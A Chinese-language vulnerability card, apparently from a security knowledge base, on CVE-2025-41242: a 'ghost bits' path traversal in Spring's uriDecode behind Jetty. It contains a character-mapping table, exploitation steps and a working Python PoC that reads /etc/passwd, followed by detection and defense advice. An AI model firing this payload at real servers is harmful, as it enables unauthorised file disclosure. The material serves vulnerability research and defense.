---
id: web-java-framework-spring-ghost-bits-path-traversal
title: Spring uriDecode 高位截断“幽灵比特”路径穿越
type: scenario
domain: web
path: web/java/framework/spring
technique: ghost-bits-path-traversal
aliases:
- 幽灵比特
- Ghost Bits
- 高位截断路径穿越
- CVE-2025-41242
- Spring 路径穿越
tags:
- java
- spring
- jetty
- path-traversal
- uri-decoding
- cjk
- file-read
cve:
- CVE-2025-41242
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: Spring Framework < 6.2.10（原文标注 6.2.10 为修复安全版本；靶场镜像 spring-boot-jetty:3.2.4）
verification:
  verified_by: verifier-G
  verified_at: '2026-11-04T19:23:04+08:00'
  notes: 已对照 content.md 与全部 11 张图片核对：CVE-2025-41242、StringUtils.uriDecode 的 baos.write(ch) 高位截断、阮/严/灵/丰/甲/来 截断映射表、Jetty URIUtil 的 %uXXXX 解析、changed 需末尾合法 %XX（%64）激活、基线 /../etc/passwd 返回 400 Bad URI、利用返回 200 并读取 /etc/passwd、修复版 6.2.10 与 StringBuilder.append 均与正文/截图一致。图片 11 显示修复后返回 400 而正文写 404，卡片按 400/404 均表示拒绝处理。已按原文补 affected_versions：Spring Framework < 6.2.10（原文标注 6.2.10 为修复安全版本；靶场镜像 spring-boot-jetty:3.2.4）。
  unverified:
  - PoC 未实际执行；未独立复现；不同版本/配置可能返回 400 或 404
---

## 一句话结论

Spring 的 `StringUtils.uriDecode` 用 `ByteArrayOutputStream.write(int)` 处理非 `%` 字符时只保留低 8 位，高位被静默截断；构造低字节恰好拼出 `%u002e` 的 CJK 字符，可绕过 Spring 的黑名单路径校验，而底层 Jetty 的 URI 解析器把 `%u002e` 还原成 `.`，最终形成 `../` 读取任意文件。

## 原理

Spring MVC 静态资源处理在 `ResourceHttpRequestHandler#getResource` 中先做 `isInvalidPath(path)` 和 `isInvalidEncodedPath(path)` 校验，命中 `../`、`%2e%2e` 等黑名单即拒绝。校验通过后，路径交给下层容器解析。

`StringUtils.uriDecode` 的循环里：

- 遇到 `%XX` 时把两个十六进制字符转成一个字节写入 `ByteArrayOutputStream`，并置 `changed=true`；
- 遇到普通字符时执行 `baos.write(ch)`。`ByteArrayOutputStream.write(int)` 只写低 8 位，Java `char` 的高 8 位被丢弃；
- 只有 `changed=true` 时才返回 `StreamUtils.copyToString(baos, charset)`，否则原样返回输入。

因此，当路径中同时存在合法 `%XX` 和特殊 CJK 字符时，CJK 字符会被截断成任意 ASCII 字符。例如：

| 字符 | Unicode | 低字节 | 截断后 |
|---|---|---|---|
| 阮 | U+962E | 0x2E | `.` |
| 严 | U+4E25 | 0x25 | `%` |
| 灵 | U+7075 | 0x75 | `u` |
| 丰 | U+4E30 | 0x30 | `0` |
| 甲 | U+7532 | 0x32 | `2` |
| 来 | U+6765 | 0x65 | `e` |

`阮严灵丰丰甲来` 截断后得到 `.%u002e`。Spring 的黑名单只认标准明文/百分号编码，不认识 `%uXXXX`；但 Jetty 的 `URIUtil` 支持 `%uXXXX` UTF-16 编码解析（受 `UriCompliance.Violation.UTF16_ENCODINGS` 影响），会把 `%u002e` 还原成 `.`，于是 `.%u002e` 变成 `..`。多组拼接并配一个末尾合法 `%XX`（如 `%64` 即 `d`）激活 `changed`，即可得到 `../../../../etc/passwd`。

## 触发条件

- Spring MVC 应用通过 `ResourceHttpRequestHandler` 提供静态资源；
- 使用存在高位截断的 Spring `StringUtils.uriDecode` 实现（受影响版本以 CVE 库为准，修复版本改为 `StringBuilder.append`）；
- 底层为 Jetty，且其 URI 解析允许 `%uXXXX` UTF-16 编码；
- 请求路径可携带原始高位 Unicode 字符，并包含至少一个合法 `%XX` 以触发 `changed=true`；
- 路径校验只做黑名单，未拒绝非 ASCII 字符或 `%u` 畸形编码。

## 利用步骤

1. 确认目标为 Spring MVC + Jetty 静态资源服务，常规 `/../etc/passwd` 返回 400；
2. 用原始 Socket 发送请求，避免 curl/requests 等客户端自动 URL 编码破坏高位字节；
3. 构造若干组 `阮严灵丰丰甲来`（每组截断为 `.%u002e`，Jetty 解码为 `..`）；
4. 末尾加合法 `%XX`（如 `/etc/passw%64`）激活 `changed` 分支；
5. 发送请求，观察是否返回 200 与目标文件内容；
6. 调整组数与目标路径读取其他文件。

## PoC

```python
import socket

HOST, PORT = "127.0.0.1", 8080
# 每组“阮严灵丰丰甲来”截断为 .%u002e，Jetty 解码为 ..；末尾 %64 激活 changed
payload_path = "/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64"

req = f"GET {payload_path} HTTP/1.1\r\n"
req += f"Host: {HOST}:{PORT}\r\n"
req += "Connection: close\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall(req.encode("utf-8"))
resp = b""
while True:
    data = s.recv(4096)
    if not data:
        break
    resp += data
s.close()
print(resp.decode("utf-8", errors="ignore"))
```

基线对照：发送 `GET /../etc/passwd` 时 Jetty 直接返回 400 `Bad URI`；使用上述载荷则绕过校验并返回文件内容。

## 变体与关联

- 变体：换用其他低字节可拼出 `%u002e` 的字符组合；构造其他 `%uXXXX` 字符（如斜杠、空字节）；改变穿越层级与目标文件。
- 关联：Spring 静态资源路径校验、Jetty `URIUtil` 的 `%uXXXX` 兼容解析；同类“上游校验/下游解码不一致”问题。
- 注意：修复版本上同一请求被拒绝；不同版本/配置可能返回 400 或 404，均表示未能穿越。

## 检测与防御

- 检测：请求路径含非 ASCII 字符且同时出现 `%XX`；路径中出现 `%u` 序列；静态资源请求返回 200 但响应为系统文件内容；WAF 对高位 Unicode 路径告警。
- 防御：升级到修复版本（`StringBuilder.append` 保留完整 16 位字符，不再产生截断）；对静态资源路径使用白名单而非黑名单；拒绝非 ASCII 路径字符与 `%uXXXX` 畸形编码；在 Jetty 侧关闭/限制 UTF-16 URI 编码兼容；确保框架、容器、代理使用一致的 URI 解码与规范化规则。
